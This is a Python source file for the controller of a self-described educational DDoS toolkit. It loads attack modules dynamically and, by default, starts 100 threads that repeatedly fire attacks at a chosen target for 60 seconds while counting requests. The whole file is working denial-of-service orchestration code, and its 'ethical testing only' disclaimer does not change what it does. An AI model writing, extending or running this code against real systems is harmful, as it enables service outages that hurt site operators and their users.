#!/usr/bin/env python3
"""
DDOS Attack Educational Toolkit - Attack Modules Controller
Author: Rajsaraswati Jatav
Purpose: Educational and Ethical Testing Only
"""

import importlib
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from utils.logger import Logger
from utils.statistics import Statistics

class AttackController:
    def __init__(self):
        self.logger = Logger()
        self.stats = Statistics()
        self.active_attacks = {}
        self.thread_pool = None
        
    def load_module(self, module_name):
        """Dynamically load attack modules"""
        try:
            module_path = f"modules.{module_name}"
            module = importlib.import_module(module_path)
            return getattr(module, module_name.title().replace('_', ''))
        except Exception as e:
            self.logger.error(f"Failed to load module {module_name}: {e}")
            return None
    
    def start_attack(self, attack_type, target, threads=100, duration=60, **kwargs):
        """Start coordinated attack"""
        attack_class = self.load_module(attack_type)
        if not attack_class:
            return False
            
        attack_id = f"{attack_type}_{int(time.time())}"
        self.active_attacks[attack_id] = {
            'type': attack_type,
            'target': target,
            'threads': threads,
            'start_time': time.time(),
            'duration': duration,
            'status': 'running'
        }
        
        # Initialize thread pool
        self.thread_pool = ThreadPoolExecutor(max_workers=threads)
        attack_instance = attack_class(target, **kwargs)
        
        # Submit attack threads
        futures = []
        for i in range(threads):
            future = self.thread_pool.submit(self._run_attack_thread, 
                                           attack_instance, duration, attack_id)
            futures.append(future)
        
        self.logger.info(f"Started {attack_type} attack on {target} with {threads} threads")
        self.stats.start_tracking(attack_id)
        
        return attack_id
    
    def _run_attack_thread(self, attack_instance, duration, attack_id):
        """Individual attack thread execution"""
        start_time = time.time()
        requests_sent = 0
        
        while (time.time() - start_time) < duration:
            try:
                success = attack_instance.execute_attack()
                self.stats.record_request(attack_id, success)
                requests_sent += 1
                time.sleep(0.01)
            except Exception as e:
                self.stats.record_error(attack_id, str(e))
                
        return requests_sent
